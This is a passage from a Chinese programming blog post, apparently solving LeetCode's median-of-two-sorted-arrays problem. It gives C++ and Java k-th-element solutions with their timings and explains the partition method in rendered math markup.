class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(nums1[newind1] &lt;= nums2[newind2]) &#123;</span><br><span class="line">                k -= newind1 - index1 + <span class="number">1</span>;</span><br><span class="line">                index1 = newind1 + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                k -= newind2 - index2 + <span class="number">1</span>;</span><br><span class="line">                index2 = newind2 + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">findMedianSortedArrays</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums1, vector&lt;<span class="keyword">int</span>&gt;&amp; nums2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = nums1.<span class="built_in">size</span>() + nums2.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(len % <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getNum</span>(nums1, nums2, len / <span class="number">2</span> + <span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in"><span class="keyword">return</span></span> (<span class="built_in">getNum</span>(nums1, nums2, len / <span class="number">2</span>) + <span class="built_in">getNum</span>(nums1, nums2, len / <span class="number">2</span> + <span class="number">1</span>)) / <span class="number">2.0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><p>执行用时: <strong>20 ms</strong></p></li><li><p>内存消耗: <strong>86.9 MB</strong></p></li></ul><blockquote><p>虽然代码理论复杂了不少，但不可否认的是，运行快了很多。</p></blockquote><p>用 Java 再次练习了一遍：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">findMedianSortedArrays</span><span class="params">(<span class="keyword">int</span>[] nums1, <span class="keyword">int</span>[] nums2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = nums1.length + nums2.length;</span><br><span class="line">        <span class="keyword">if</span>(len % <span class="number">2</span> == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> getNum(nums1, nums2, len / <span class="number">2</span> + <span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (getNum(nums1, nums2, len / <span class="number">2</span>) + getNum(nums1, nums2, len / <span class="number">2</span> + <span class="number">1</span>)) / <span class="number">2.0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getNum</span><span class="params">(<span class="keyword">int</span>[] nums1, <span class="keyword">int</span>[] nums2, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> a = nums1.length;</span><br><span class="line">        <span class="keyword">int</span> b = nums2.length;</span><br><span class="line">        <span class="keyword">int</span> index1 = <span class="number">0</span>, index2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(index1 == a) &#123;</span><br><span class="line">                <span class="keyword">return</span> nums2[index2 - <span class="number">1</span> + k];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(index2 == b) &#123;</span><br><span class="line">                <span class="keyword">return</span> nums1[index1 - <span class="number">1</span> + k];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(k == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> Math.min(nums1[index1], nums2[index2]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> newind1 = Math.min(index1 + k / <span class="number">2</span> - <span class="number">1</span>, a - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">int</span> newind2 = Math.min(index2 + k / <span class="number">2</span> - <span class="number">1</span>, b - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(nums1[newind1] &lt;= nums2[newind2]) &#123;</span><br><span class="line">                k -= newind1 - index1 + <span class="number">1</span>;</span><br><span class="line">                index1 = newind1 + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                k -= newind2 - index2 + <span class="number">1</span>;</span><br><span class="line">                index2 = newind2 + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>执行用时: <strong>3 ms</strong></p></li><li><p>内存消耗: <strong>39.4 MB</strong></p></li></ul><blockquote><p>这里挖个坑， 为什么相同代码 Java 的内存消耗和执行用时都比 C++ 要小好多？</p></blockquote><h4 id="划分数组">划分数组</h4><p>在这道题的官方题解中，还提到了第二种方法： <strong>划分数组</strong>。</p><blockquote><p><strong>说明</strong></p><p>方法一的时间复杂度已经很优秀了，但本题存在时间复杂度更低的一种方法。这里给出推导过程，勇于挑战自己的读者可以进行尝试。</p><p><strong>思路与算法</strong></p><p>为了使用划分的方法解决这个问题，需要理解「中位数的作用是什么」。在统计中，中位数被用来：</p><blockquote><p>将一个集合划分为两个长度相等的子集，其中一个子集中的元素总是大于另一个子集中的元素。</p></blockquote><p>如果理解了中位数的划分作用，就很接近答案了。</p><p>首先，在任意位置 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 将 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> 划分成两个部分：</p><pre><code>       left_A            |          right_AA[0], A[1], ..., A[i-1]  |  A[i], A[i+1], ..., A[m-1]</code></pre><p>由于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> 中有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 个元素， 所以有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">m+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 种划分的方法（<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>∈</mo><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mi>m</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">i∈[0,m]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6986em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mclose">]</span></span></span></span>）。</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>len</mtext><mo stretchy="false">(</mo><mtext>left_A</mtext><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\text{len}(\text{left\_A})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mord text"><span class="mord">len</span></span><span class="mopen">(</span><span class="mord text"><span class="mord">left_A</span></span><span class="mclose">)</span></span></span></span> = <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span>, <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>len</mtext><mo stretchy="false">(</mo><mtext>right_A</mtext><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\text{len}(\text{right\_A})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mord text"><span class="mord">len</span></span><span class="mopen">(</span><span class="mord text"><span class="mord">right_A</span></span><span class="mclose">)</span></span></span></span> = <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>−</mo><mi>i</mi></mrow><annotation encoding="application/x-tex">m - i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span>,<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mi>e</mi><mi>n</mi><mo stretchy="false">(</mo><mi>r</mi><mi>i</mi><mi>g</mi><mi>h</mi><msub><mi>t</mi><mi>A</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mi>m</mi><mo>−</mo><mi>i</mi></mrow><annotation encoding="application/x-tex">len(right_A)=m−i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">h</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span>.</p><p>注意：当 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">i=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> 时，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>left_A</mtext></mrow><annotation encoding="application/x-tex">\text{left\_A}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"></span><span class="mord text"><span class="mord">left_A</span></span></span></span></span> 为空集， 而当 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>=</mo><mi>m</mi></mrow><annotation encoding="application/x-tex">i=m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 时, <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>right_A</mtext></mrow><annotation encoding="application/x-tex">\text{right\_A}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"></span><span class="mord text"><span class="mord">right_A</span></span></span></span></span>为空集。</p><p>采用同样的方式，在任意位置 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span> 将 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>B</mtext></mrow><annotation encoding="application/x-tex">\text{B}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord text"><span class="mord">B</span></span></span></span></span> 划分成两个部分：</p><pre><code>       left_B            |          right_BB[0], B[1], ..., B[j-1]  |  B[j], B[j+1], ..., B[n-1]</code></pre><p>将 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>left_A</mtext></mrow><annotation encoding="application/x-tex">\text{left\_A}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"></span><span class="mord text"><span class="mord">left_A</span></span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>left_B</mtext></mrow><annotation encoding="application/x-tex">\text{left\_B}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"></span><span class="mord text"><span class="mord">left_B</span></span></span></span></span> 放入一个集合，并将 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>right_A</mtext></mrow><annotation encoding="application/x-tex">\text{right\_A}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"></span><span class="mord text"><span class="mord">right_A</span></span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>right_B</mtext></mrow><annotation encoding="application/x-tex">\text{right\_B}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"></span><span class="mord text"><span class="mord">right_B</span></span></span></span></span> 放入另一个集合。 再把这两个新的集合分别命名为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>left_part</mtext></mrow><annotation encoding="application/x-tex">\text{left\_part}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"></span><span class="mord text"><span class="mord">left_part</span></span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>right_part</mtext></mrow><annotation encoding="application/x-tex">\text{right\_part}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"></span><span class="mord text"><span class="mord">right_part</span></span></span></span></span>：</p><pre><code>      left_part          |         right_partA[0], A[1], ..., A[i-1]  |  A[i], A[i+1], ..., A[m-1]B[0], B[1], ..., B[j-1]  |  B[j], B[j+1], ..., B[n-1]</code></pre><p>当 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>A</mtext></mrow><annotation encoding="application/x-tex">\text{A}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord text"><span class="mord">A</span></span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>B</mtext></mrow><annotation encoding="application/x-tex">\text{B}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord text"><span class="mord">B</span></span></span></span></span> 的总长度是偶数时，如果可以确认：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>len</mtext><mo stretchy="false">(</mo><mtext>left_part</mtext><mo stretchy="false">)</mo><mo>=</mo><mtext>len</mtext></mrow><annotation encoding="application/x-tex">\text{len}(\text{left\_part}) = \text{len}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mord text"><span class="mord">len</span></span><span class="mopen">(</span><span class="mord text"><span class="mord">left_part</span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord text"><span class="mord">len</span></span></span></span></span>(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>right_part</mtext><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\text{right\_part})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mord text"><span class="mord">right_part</span></span><span class="mclose">)</span></span></span></span><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>max</mi><mo>⁡</mo><mo stretchy="false">(</mo><mtext>left_part</mtext><mo stretchy="false">)</mo><mo>≤</mo><mi>min</mi><mo>⁡</mo><mo stretchy="false">(</mo><mtext>right_part</mtext><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\max(\text{left\_part}) \leq \min(\text{right\_part})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mop">max</span><span class="mopen">(</span><span class="mord text"><span class="mord">left_part</span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mop">min</span><span class="mopen">(</span><span class="mord text"><span class="mord">right_part</span></span><span class="mclose">)</span></span></span></span><br>那么，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">{</mo><mtext>A</mtext><mo separator="true">,</mo><mtext>B</mtext><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\{\text{A}, \text{B}\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord text"><span class="mord">A</span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord text"><span class="mord">B</span></span><span class="mclose">}</span></span></span></span> 中的所有元素已经被划分为相同长度的两个部分，且前一部分中的元素总是小于或等于后一部分中的元素。中位数就是前一部分的最大值和后一部分的最小值的平均值：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>median</mtext></mrow><annotation encoding="application/x-tex">\text{median}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord text"><span class="mord">median</span></span></span></span></span> = <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><mtext>max</mtext><mo stretchy="false">(</mo><mtext>left</mtext><mi mathvariant="normal">_</mi><mtext>part</mtext><mo stretchy="false">)</mo><mo>+</mo><mtext>min</mtext><mo stretchy="false">(</mo><mtext>right</mtext><mi mathvariant="normal">_</mi><mtext>part</mtext><mo stretchy="false">)</mo></mrow><mn>2</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{\text{max}(\text{left}\_\text{part}) + \text{min}(\text{right}\_\text{part})}{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.397em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.052em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.527em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord text mtight"><span class="mord mtight">max</span></span><span class="mopen mtight">(</span><span class="mord text mtight"><span class="mord mtight">left</span></span><span class="mord mtight" style="margin-right:0.02778em;">_</span><span class="mord text mtight"><span class="mord mtight">part</span></span><span class="mclose mtight">)</span><span class="mbin mtight">+</span><span class="mord text mtight"><span class="mord mtight">min</span></span><span class="mopen mtight">(</span><span class="mord text mtight"><span class="mord mtight">right</span></span><span class="mord mtight" style="margin-right:0.02778em;">_</span><span class="mord text mtight"><span class="mord mtight">part</span></span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></p><p>当 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>A</mtext></mrow><annotation encoding="application/x-tex">\text{A}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord text"><span class="mord">A</span></span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>B</mtext></mrow><annotation encoding="application/x-tex">\text{B}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord text"><span class="mord">B</span></span></span></span></span> 的总长度是奇数时，如果可以确认：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>len</mtext><mo stretchy="false">(</mo><mtext>left_part</mtext><mo stretchy="false">)</mo><mo>=</mo><mtext>len</mtext></mrow><annotation encoding="application/x-tex">\text{len}(\text{left\_part}) = \text{len}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mord text"><span class="mord">len</span></span><span class="mopen">(</span><span class="mord text"><span class="mord">left_part</span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord text"><span class="mord">len</span></span></span></span></span>(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>right_part</mtext><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">\text{right\_part})+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mord text"><span class="mord">right_part</span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>max</mi><mo>⁡</mo><mo stretchy="false">(</mo><mtext>left_part</mtext><mo stretchy="false">)</mo><mo>≤</mo><mi>min</mi><mo>⁡</mo><mo stretchy="false">(</mo><mtext>right_part</mtext><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\max(\text{left\_part}) \leq \min(\text{right\_part})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mop">max</span><span class="mopen">(</span><span class="mord text"><span class="mord">left_part</span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mop">min</span><span class="mopen">(</span><span class="mord text"><span class="mord">right_part</span></span><span class="mclose">)</span></span></span></span><br>那么，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">{</mo><mtext>A</mtext><mo separator="true">,</mo><mtext>B</mtext><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\{\text{A}, \text{B}\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord text"><span class="mord">A</span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord text"><span class="mord">B</span></span><span class="mclose">}</span></span></span></span> 中的所有元素已经被划分为两个部分，前一部分比后一部分多一个元素，且前一部分中的元素总是小于或等于后一部分中的元素。中位数就是前一部分的最大值：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>median</mtext><mo>=</mo><mtext>max</mtext><mo stretchy="false">(</mo><mtext>left</mtext><mi mathvariant="normal">_</mi><mtext>part</mtext><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\text{median} = \text{max}(\text{left}\_\text{part})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord text"><span class="mord">median</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mord text"><span class="mord">max</span></span><span class="mopen">(</span><span class="mord text"><span class="mord">left</span></span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord text"><span class="mord">part</span></span><span 